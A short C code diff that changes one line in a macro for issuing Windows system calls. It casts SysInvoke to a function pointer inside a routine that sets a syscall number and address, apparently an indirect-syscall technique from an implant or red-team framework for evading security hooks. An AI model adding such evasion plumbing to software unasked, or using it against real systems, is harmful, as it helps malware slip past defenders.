@@ -14,7 +14,7 @@
         SysConfig.Ssn = Instance->Syscall.SYS_NAME;                                                           \
         SysConfig.Adr = Instance->Syscall.SysAddress;                                                         \
         SysSetConfig( &SysConfig );                                                                          \
-        NtStatus = SysInvoke( __VA_ARGS__ );                                                                 \
+        NtStatus = ( ( NTSTATUS ( * ) ( ) ) SysInvoke ) ( __VA_ARGS__ );                                     \
     } else {                                                                                                 \
         NtStatus = Instance->Win32.SYS_NAME( __VA_ARGS__ );                                                   \
     }                                                                                                        \
